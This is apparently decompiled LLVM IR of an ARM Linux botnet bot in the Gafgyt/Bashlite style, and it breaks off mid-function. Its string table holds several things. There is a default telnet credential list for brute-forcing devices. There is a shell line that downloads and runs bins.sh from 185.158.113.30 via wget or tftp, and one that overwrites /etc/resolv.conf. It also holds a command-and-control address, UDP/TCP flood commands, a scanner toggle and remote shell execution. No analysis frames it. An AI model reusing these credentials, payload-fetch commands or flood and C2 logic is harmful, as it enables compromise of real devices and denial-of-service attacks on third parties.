source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%sockaddr = type { i32, [14 x i8] }
%timespec = type { i32, i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%rusage = type { %timeval, %timeval, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%timeval = type { i32, i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.1 = constant i32 -352321502
@global_var_20208.5 = global i32 0
@global_var_20218.6 = global i32* @global_var_20208.5
@global_var_205b8.12 = global i32 0
@global_var_f578.18 = constant i32 -509558771
@global_var_168c8.21 = constant [8 x i8] c"UNKNOWN\00"
@global_var_8204.22 = constant i32 -476053420
@global_var_10200.23 = constant i32 93980
@global_var_168d0.25 = constant [11 x i8] c"BIG_ENDIAN\00"
@global_var_205e8.34 = global i32 0
@global_var_205ec.35 = local_unnamed_addr global i32 0
@global_var_205f0.36 = local_unnamed_addr global i32 0
@global_var_20270.39 = local_unnamed_addr global i32 4095
@global_var_2026c.42 = global i32 362436
@global_var_1690c.44 = constant [7 x i8] c"(null)\00"
@global_var_245e8.46 = local_unnamed_addr global i32 0
@global_var_16914.48 = constant [8 x i8] c"/bin/sh\00"
@global_var_1691c.50 = constant [3 x i8] c"sh\00"
@global_var_16920.52 = constant [3 x i8] c"-c\00"
@global_var_16924.55 = constant i32 -1
@global_var_16d24.57 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_16d34.59 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_205d0.63 = global i32 0
@global_var_16d40.65 = constant [5 x i8] c"PING\00"
@global_var_205d8.67 = global i32 0
@global_var_205dc.68 = local_unnamed_addr global i32 0
@global_var_26654.70 = global i32 0
@global_var_16d48.72 = constant [6 x i8] c":>%$#\00"
@global_var_16d50.74 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_2664c.76 = global i32 0
@global_var_16d5c.78 = constant [6 x i8] c"ogin:\00"
@global_var_16748.80 = constant [5 x i8] c"root\00"
@global_var_16750.81 = constant [8 x i8] c"support\00"
@global_var_1675c.82 = constant [6 x i8] c"admin\00"
@global_var_16764.83 = constant [9 x i8] c"smcadmin\00"
@global_var_16770.84 = constant [5 x i8] c"1234\00"
@global_var_16778.85 = constant [6 x i8] c"12345\00"
@global_var_16780.86 = constant [7 x i8] c"123456\00"
@global_var_16788.87 = constant [9 x i8] c"password\00"
@global_var_16794.88 = constant [5 x i8] c"pass\00"
@global_var_1679c.89 = constant [9 x i8] c"dreambox\00"
@global_var_167a8.90 = constant [14 x i8] c"sh || shell\0D\0A\00"
@global_var_167b8.91 = constant [79 x i8] c"cd /var/ || cd /tmp/ || cd /var/run( || cd /var/tmp/ || cd /dev/ || cd /mnt/\0D\0A\00"
@global_var_16808.92 = constant [125 x i8] c"busybox wget || wget 185.158.113.30/bins.sh; busybox tftp || tftp -g -r 185.158.113.30 bins.sh; sh bins.sh || bash bins.sh\0D\0A\00"
@global_var_16888.93 = constant [61 x i8] c"busybox echo || echo nameserver 8.8.8.8 > /etc/resolv.conf\0D\0A\00"
@global_var_20228.94 = global [17 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_16748.80, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_16750.81, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1675c.82, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_16748.80, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1675c.82, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_16764.83, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_16750.81, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_16770.84, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_16778.85, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_16780.86, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_16788.87, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_16794.88, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1679c.89, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_167a8.90, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_167b8.91, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_16808.92, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_16888.93, i32 0, i32 0)]
@global_var_16d64.96 = constant [3 x i8] c"\0D\0A\00"
@global_var_16d68.98 = constant [9 x i8] c"assword:\00"
@global_var_16d74.100 = constant [9 x i8] c"ncorrect\00"
@global_var_20234.102 = global [14 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_16748.80, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1675c.82, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_16764.83, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_16750.81, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_16770.84, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_16778.85, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_16780.86, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_16788.87, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_16794.88, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1679c.89, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_167a8.90, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_167b8.91, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_16808.92, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_16888.93, i32 0, i32 0)]
@global_var_2025c.104 = local_unnamed_addr global [4 x i8*] [i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_167a8.90, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_167b8.91, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_16808.92, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_16888.93, i32 0, i32 0)]
@global_var_20268.106 = local_unnamed_addr global [61 x i8]* @global_var_16888.93
@global_var_20260.108 = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_167b8.91, i32 0, i32 0), i8* getelementptr inbounds ([125 x i8], [125 x i8]* @global_var_16808.92, i32 0, i32 0)]
@global_var_20264.110 = local_unnamed_addr global [125 x i8]* @global_var_16808.92
@global_var_16d80.112 = constant [4 x i8] c"all\00"
@global_var_16d84.114 = constant i32 44
@global_var_16d88.116 = constant [4 x i8] c"syn\00"
@global_var_16d8c.118 = constant [4 x i8] c"rst\00"
@global_var_16d90.120 = constant [4 x i8] c"fin\00"
@global_var_16d94.122 = constant [4 x i8] c"ack\00"
@global_var_16d98.124 = constant [4 x i8] c"psh\00"
@global_var_16d9c.127 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_16db0.131 = constant [6 x i8] c"PONG!\00"
@global_var_16db8.133 = constant [11 x i8] c"GETLOCALIP\00"
@global_var_16dc4.136 = constant [10 x i8] c"My IP: %s\00"
@global_var_16dd0.138 = constant [5 x i8] c"HOLD\00"
@global_var_16dd8.141 = constant [5 x i8] c"JUNK\00"
@global_var_16de0.143 = constant [4 x i8] c"UDP\00"
@global_var_16de4.145 = constant [4 x i8] c"TCP\00"
@global_var_16de8.147 = constant [9 x i8] c"KILLATTK\00"
@global_var_16df4.151 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_20224.154 = local_unnamed_addr global i32 -1
@global_var_16734.156 = constant [17 x i8] c"185.158.113.30:7\00"
@global_var_20220.157 = global [17 x i8]* @global_var_16734.156
@global_var_16e00.159 = constant [8 x i8] c"8.8.8.8\00"
@global_var_16e08.162 = constant [16 x i8] c"/proc/net/route\00"
@global_var_16e18.164 = constant [11 x i8] c"\0900000000\09\00"
@global_var_205e0.166 = global i32 0
@global_var_16e24.168 = constant [6 x i8] c"-bash\00"
@global_var_16e64.170 = constant i32 1831885595
@global_var_16e2c.172 = constant [46 x i8] c"%sWelcome to the botnet [%s:%s:%d cores] :)%s\00"
@global_var_16e5c.174 = constant i32 859003675
@1 = constant i32 47
@global_var_16e70.178 = constant [38 x i8] c"%sCould not connect to commServer!%s\0A\00"
@global_var_16e98.181 = constant [17 x i8] c"BUILD [%s:%s:%d]\00"
@global_var_16eac.185 = constant [8 x i8] c"SCANNER\00"
@global_var_16eb4.187 = constant [17 x i8] c"SCANNER ON | OFF\00"
@global_var_16ec8.189 = constant [4 x i8] c"OFF\00"
@global_var_26650.191 = global i32 0
@global_var_16ecc.193 = constant [17 x i8] c"SCANNER STOPPED!\00"
@global_var_16ee0.195 = constant [3 x i8] c"ON\00"
@global_var_16ee4.197 = constant [28 x i8] c"attempting to start scanner\00"
@global_var_16f00.199 = constant [17 x i8] c"SCANNER STARTED!\00"
@global_var_16f14.202 = constant [5 x i8] c"PONG\00"
@global_var_16f1c.203 = constant [4 x i8] c"DUP\00"
@global_var_16f20.205 = constant [3 x i8] c"SH\00"
@global_var_16f24.207 = constant [8 x i8] c"%s 2>&1\00"
@2 = constant i32 114
@global_var_16f30.211 = constant [3 x i8] c"%s\00"
@global_var_16f34.213 = constant i32 32
@global_var_20278 = external global i32
@global_var_20280 = external local_unnamed_addr global i32
@global_var_26640.223 = global i32 0
@global_var_20288 = external global i32
@global_var_13ab4.226 = constant i32 -476053504
@global_var_17538.235 = constant i32 0
@global_var_2029c.237 = global i32 0
@global_var_202b4.239 = global i32 0
@global_var_20298.241 = global i32* bitcast (i8** @global_var_202d0.218 to i32*)
@global_var_10c4c.243 = constant i32 -382910448
@global_var_141d0.244 = constant i32 -382909968
@global_var_1428c.249 = constant i32 -382910224
@global_var_1756c.251 = constant i32 135270416
@global_var_17550.253 = constant [6 x i8] c"(nil)\00"
@global_var_17558.256 = constant [7 x i8] c"(null)\00"
@global_var_17560.258 = constant i32 2949163
@global_var_175ec.261 = constant i32 16843008
@global_var_175d4.263 = constant i32 327688
@global_var_175cc.268 = constant [8 x i8] c" +0-#'I\00"
@global_var_17574.270 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_175b4.272 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_175a7.274 = constant i32 117506048
@global_var_175a8.276 = constant i32 252117248
@global_var_17598.278 = constant i32 331776
@global_var_17588.280 = constant i32 335616
@global_var_11dec.281 = constant i32 -456978431
@global_var_17608.287 = constant [8 x i8] c"Success\00"
@global_var_175f8.289 = constant [15 x i8] c"Unknown error \00"
@global_var_265f4.291 = global i32 0
@global_var_265f8.294 = global i32 0
@global_var_26658.296 = global i32 0
@global_var_26608.298 = global i32 0
@global_var_204bc.301 = global i32 256
@global_var_203c0.302 = global i32* @global_var_204bc.301
@global_var_26630.305 = global i32 0
@global_var_266d8.307 = global i32 0
@global_var_14020.308 = constant i32 -382910416
@global_var_129a8.315 = constant i32 -442564520
@global_var_204c8.317 = global i32 0
@global_var_10918.319 = constant i32 -481230848
@global_var_26620.321 = global i32 0
@global_var_10624.323 = constant i32 -509587456
@global_var_204e0.325 = global i32 0
@global_var_204f8 = external global i32
@global_var_18164.344 = constant i32 0
@global_var_20594.348 = global i32 0
@global_var_26624.352 = local_unnamed_addr global i32 0
@global_var_2662c.357 = global i32 0
@global_var_136a8.359 = constant i32 80156
@global_var_201fc.365 = global i32 -1
@global_var_26634.368 = global i32 0
@global_var_26638.370 = local_unnamed_addr global i32 0
@global_var_13aa0.371 = constant i32 -390234096
@global_var_18190.373 = constant [10 x i8] c"/dev/null\00"
@global_var_2663c.375 = global i32 0
@global_var_10b14.379 = constant i32 -382909968
@global_var_26628.381 = local_unnamed_addr global i32 0
@global_var_11d60.384 = constant [3 x i8] c"R\0C\00"
@global_var_1818c.390 = constant i32 0
@global_var_205ac.391 = local_unnamed_addr global i32* @global_var_1818c.390
@global_var_10a18.396 = constant i32 -442564608
@global_var_13d68.398 = constant i32 -335544937
@global_var_13ea0.401 = constant i32 -275775369
@global_var_26648.404 = global i32 0
@global_var_1819c.408 = constant [4 x i8] c"inf\00"
@global_var_181b0.411 = constant i32 1076101120
@global_var_1819f.416 = constant i32 1179535616
@global_var_181ac.418 = constant i32 2883630
@global_var_14eb0.419 = constant i32 -514785280
@global_var_266f0.426 = global i32 0
@global_var_266f4.428 = global i32 0
@global_var_15e8c.436 = constant i32 -504313148
@global_var_15e74.437 = constant i32 -483131392
@global_var_15d34.438 = constant i32 -481294847
@global_var_15eec.439 = constant i32 -477821825
@global_var_162d8.440 = constant i32 -516685812
@global_var_161dc.441 = constant i32 -905969576
@global_var_16358.442 = constant i32 -478149505
@global_var_16340.443 = constant i32 -534773758
@global_var_162f4.444 = constant i32 -534773758
@global_var_1628c.445 = constant i32 -483131392
@global_var_20200.447 = global i32 0
@global_var_205b4.3 = external global i8*
@3 = internal constant [3 x i8] c" \01\00"
@global_var_202d0.218 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @3, i32 0, i32 0)
@global_var_20320.219 = local_unnamed_addr global i8 16
@global_var_202d1.232 = local_unnamed_addr global i8 1
@global_var_20321.233 = local_unnamed_addr global i8 1
@global_var_10b94.355 = constant i16 16432
@global_var_16e6c.176 = constant [2 x i8] c"/\00"
@global_var_16f2c.209 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8094() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @function_8130()
  %v1_80a4 = call i32 @function_166e4(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @function_80b0() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_205b4.3 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_205b4.3 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_20218.6 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_20218.6 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_20218.6 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_20218.6 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_205b4.3 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_20218.6, { 1, 0 }
  uselistorder i8** @global_var_205b4.3, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @function_8124(i32* %arg1) local_unnamed_addr {
dec_label_pc_8124:
  %v0_8124 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8124, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_8124
  %v1_8124 = load i32, i32* @r8, align 4
  store i32 %v1_8124, i32* %arg1, align 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_8124, %bb
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_8130() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* inttoptr (i32 131596 to i32*), align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 131596

bb2:                                              ; preds = %.thread
  ret i32 131596

; uselistorder directives
  uselistorder i32 131596, { 1, 0, 2 }
}

define i32 @function_8188() local_unnamed_addr {
dec_label_pc_8188:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

define i32 @entry_point(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @function_13b54(i32 ptrtoint (i32* @global_var_f578.18 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 91936, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @function_12bd4()
  ret i32 %v0_81bc
}

define i32 @function_81dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_81dc:
  ret i32 ptrtoint ([8 x i8]* @global_var_168c8.21 to i32)
}

define i32 @function_81f8() local_unnamed_addr {
dec_label_pc_81f8:
  %v3_81fc = load i32, i32* @fp, align 4
  %v1_8208 = call i32 @function_13698(i32 84)
  store i32 %v3_81fc, i32* @fp, align 4
  ret i32 %v1_8208
}

define i32 @function_8218() local_unnamed_addr {
dec_label_pc_8280:
  ret i32 ptrtoint (i8* select (i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10200.23 to i32), i32 3), i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_168d0.25, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_168c8.21, i32 0, i32 0)) to i32)
}

define i32 @function_832c(i32 %arg1) local_unnamed_addr {
dec_label_pc_832c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_833c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_833c, i32* @global_var_205e8.34, align 4
  %v1_835c = add i32 %v0_833c, -1640531527
  store i32 %v1_835c, i32* @global_var_205ec.35, align 4
  %v1_8378 = add i32 %v0_833c, 1013904242
  store i32 %v1_8378, i32* @global_var_205f0.36, align 4
  br label %dec_label_pc_8390

dec_label_pc_8390:                                ; preds = %dec_label_pc_832c, %dec_label_pc_8390
  %storemerge12 = phi i32 [ 3, %dec_label_pc_832c ], [ %v1_83d4, %dec_label_pc_8390 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_83a0 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_205e8.34 to i32), i32 -12)
  %v6_83a0 = inttoptr i32 %v5_83a0 to i32*
  %v7_83a0 = load i32, i32* %v6_83a0, align 4
  %tmp9 = mul i32 %storemerge12, 4
  %v5_83b0 = add i32 %tmp9, add (i32 ptrtoint (i32* @global_var_205e8.34 to i32), i32 -8)
  %v6_83b0 = inttoptr i32 %v5_83b0 to i32*
  %v7_83b0 = load i32, i32* %v6_83b0, align 4
  %v2_83b4 = xor i32 %storemerge12, -1640531527
  %v2_83bc = xor i32 %v2_83b4, %v7_83a0
  %v2_83c4 = xor i32 %v2_83bc, %v7_83b0
  %v5_83cc = mul nuw nsw i32 %storemerge12, 4
  %v6_83cc = add i32 %v5_83cc, ptrtoint (i32* @global_var_205e8.34 to i32)
  %v7_83cc = inttoptr i32 %v6_83cc to i32*
  store i32 %v2_83c4, i32* %v7_83cc, align 4
  %v1_83d4 = add nuw nsw i32 %storemerge12, 1
  %v7_83ec = icmp slt i32 %v1_83d4, 4096
  br i1 %v7_83ec, label %dec_label_pc_8390, label %dec_label_pc_83f0

dec_label_pc_83f0:                                ; preds = %dec_label_pc_8390
  %v9_83f4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_83f4

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8390, { 1, 0 }
}

define i32 @function_8400() local_unnamed_addr {
dec_label_pc_8400:
  %r1.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8400 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8400, i32* @ip, align 4
  %v3_8404 = load i32, i32* @r4, align 4
  %v6_8404 = load i32, i32* @fp, align 4
  %v13_8404 = load i32, i32* @lr, align 4
  %v2_8430 = load i32, i32* @global_var_20270.39, align 4
  %v1_8434 = add i32 %v2_8430, 1
  %v3_843c = urem i32 %v1_8434, 4096
  store i32 %v3_843c, i32* @global_var_20270.39, align 4
  %v4_8454 = mul nuw nsw i32 %v3_843c, 4
  %v5_8454 = add i32 %v4_8454, ptrtoint (i32* @global_var_205e8.34 to i32)
  %v6_8454 = inttoptr i32 %v5_8454 to i32*
  %v7_8454 = load i32, i32* %v6_8454, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v12_846c = call i32 @function_104dc(i32 %v7_8454, i32 0, i32 18782, i32 0, i32 18782, i32 0, i32 -2, i32 %v3_8404, i32 %v6_8404, i32 %v1_8400, i32 %v13_8404, i32 33804)
  store i32 %v12_846c, i32* %r1.global-to-local, align 4
  %v2_8484 = load i32, i32* @global_var_2026c.42, align 4
  %v2_848c = add i32 %v2_8484, %v12_846c
  %v3_848c = icmp ult i32 %v2_848c, %v2_8484
  %v4_8490 = zext i1 %v3_848c to i32
  %v2_84c0 = add i32 %v4_8490, %v2_848c
  %v3_84d4 = icmp ult i32 %v2_84c0, %v4_8490
  br i1 %v3_84d4, label %dec_label_pc_84dc, label %dec_label_pc_84fc

dec_label_pc_84dc:                                ; preds = %dec_label_pc_8400
  %v1_84e0 = add i32 %v2_84c0, 1
  %v1_84f0 = select i1 %v3_848c, i32 2, i32 1
  br label %dec_label_pc_84fc

dec_label_pc_84fc:                                ; preds = %dec_label_pc_8400, %dec_label_pc_84dc
  %storemerge = phi i32 [ %v1_84f0, %dec_label_pc_84dc ], [ %v4_8490, %dec_label_pc_8400 ]
  %stack_var_-28.0 = phi i32 [ %v1_84e0, %dec_label_pc_84dc ], [ %v2_84c0, %dec_label_pc_8400 ]
  store i32 %storemerge, i32* @global_var_2026c.42, align 4
  %v2_8500 = load i32, i32* @global_var_20270.39, align 4
  store i32 %v2_8500, i32* %r1.global-to-local, align 4
  %v2_850c = sub i32 -2, %stack_var_-28.0
  %v5_8514 = mul i32 %v2_8500, 4
  %v6_8514 = add i32 %v5_8514, ptrtoint (i32* @global_var_205e8.34 to i32)
  %v7_8514 = inttoptr i32 %v6_8514 to i32*
  store i32 %v2_850c, i32* %v7_8514, align 4
  %v1_851c = load i32, i32* %r1.global-to-local, align 4
  %v4_851c = mul i32 %v1_851c, 4
  %v5_851c = add i32 %v4_851c, ptrtoint (i32* @global_var_205e8.34 to i32)
  %v6_851c = inttoptr i32 %v5_851c to i32*
  %v7_851c = load i32, i32* %v6_851c, align 4
  store i32 %v3_8404, i32* @r4, align 4
  store i32 %v6_8404, i32* @fp, align 4
  ret i32 %v7_851c

; uselistorder directives
  uselistorder i32 %v4_8490, { 0, 2, 1 }
  uselistorder i32 %v2_8484, { 1, 0 }
  uselistorder i32 %v3_843c, { 1, 0 }
  uselistorder i32 18782, { 1, 0 }
  uselistorder i32* @global_var_205e8.34, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_205e8.34 to i32), { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* @global_var_20270.39, { 1, 0, 2 }
  uselistorder label %dec_label_pc_84fc, { 1, 0 }
}

define i32 @function_8538(i32 %arg1) local_unnamed_addr {
dec_label_pc_8538:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8538 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8538, i32* @ip, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_8558 = call i32 @function_11e30()
  store i32 %v0_8558, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8578

dec_label_pc_8578:                                ; preds = %dec_label_pc_8578, %dec_label_pc_8538
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_8538 ], [ %v1_8570, %dec_label_pc_8578 ]
  %v3_8580 = load i32, i32* %stack_var_-32, align 4
  %v2_8584 = add i32 %v3_8580, %stack_var_-24.0
  %v1_8588 = inttoptr i32 %v2_8584 to i8*
  %v2_8588 = load i8, i8* %v1_8588, align 1
  %v3_8588 = zext i8 %v2_8588 to i32
  store i32 %v3_8588, i32* %r0.global-to-local, align 4
  %v1_8590 = call i32 @function_109cc(i32 %v3_8588)
  store i32 %v1_8590, i32* %r0.global-to-local, align 4
  %v2_8598 = icmp eq i32 %v1_8590, 0
  %v1_8570 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8598, label %dec_label_pc_85b0.preheader, label %dec_label_pc_8578

dec_label_pc_85b0.preheader:                      ; preds = %dec_label_pc_8578
  %v1_8560 = add i32 %v0_8558, -1
  %v5_85bc10 = icmp slt i32 %v1_8560, %stack_var_-24.0
  br i1 %v5_85bc10, label %dec_label_pc_8630.preheader, label %dec_label_pc_85c0

dec_label_pc_85a4:                                ; preds = %dec_label_pc_85c0
  %v1_85a8 = add i32 %stack_var_-20.011, -1
  %v5_85bc = icmp slt i32 %v1_85a8, %stack_var_-24.0
  br i1 %v5_85bc, label %dec_label_pc_8630.preheader, label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %dec_label_pc_85b0.preheader, %dec_label_pc_85a4
  %stack_var_-20.011 = phi i32 [ %v1_85a8, %dec_label_pc_85a4 ], [ %v1_8560, %dec_label_pc_85b0.preheader ]
  %v3_85c8 = load i32, i32* %stack_var_-32, align 4
  %v2_85cc = add i32 %v3_85c8, %stack_var_-20.011
  %v1_85d0 = inttoptr i32 %v2_85cc to i8*
  %v2_85d0 = load i8, i8* %v1_85d0, align 1
  %v3_85d0 = zext i8 %v2_85d0 to i32
  store i32 %v3_85d0, i32* %r0.global-to-local, align 4
  %v1_85d8 = call i32 @function_109cc(i32 %v3_85d0)
  store i32 %v1_85d8, i32* %r0.global-to-local, align 4
  %v2_85e0 = icmp eq i32 %v1_85d8, 0
  br i1 %v2_85e0, label %dec_label_pc_8630.preheader, label %dec_label_pc_85a4

dec_label_pc_8630.preheader:                      ; preds = %dec_label_pc_85a4, %dec_label_pc_85c0, %dec_label_pc_85b0.preheader
